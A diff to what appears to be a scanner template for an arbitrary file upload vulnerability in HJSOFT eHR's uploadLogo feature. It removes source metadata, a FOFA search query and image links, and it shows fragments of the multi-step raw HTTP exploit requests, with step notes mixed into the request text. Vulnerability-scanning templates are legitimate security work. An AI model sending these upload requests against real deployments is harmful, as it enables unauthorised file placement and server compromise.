@@ -3,12 +3,8 @@ info:
   name: 宏景eHR uploadLogo存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yl80wz0m5xsct68g'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yl80wz0m5xsct68g
-    fofa: app="HJSOFT-HCM"
 http:
 - raw:
   - 'GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
@@ -29,7 +25,6 @@ http:
 
     Connection: close
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1731289061524-9b83861e-842a-4de8-83e0-b5ef84c56911.png)
 
     2.获取上传路径'
   redirects: false
@@ -78,7 +73,6 @@ http:
 
     ------WebKitFormBoundaryfjKBvGWJbG07Z02r--
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1731289061815-5d97d57f-89ab-4e72-997d-d9ab725312f1.png)
 
     3.替换获取的路径请求上传'
   redirects: false
@@ -105,9 +99,7 @@ http:
 
     Accept-Language: zh-CN,zh;q=0.9
 
-    Connection: close
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1731289062430-db4dd04b-7c50-42b7-bb0a-82b22357e06d.png)'
+    Connection: close'
   redirects: false
   matchers:
   - status:
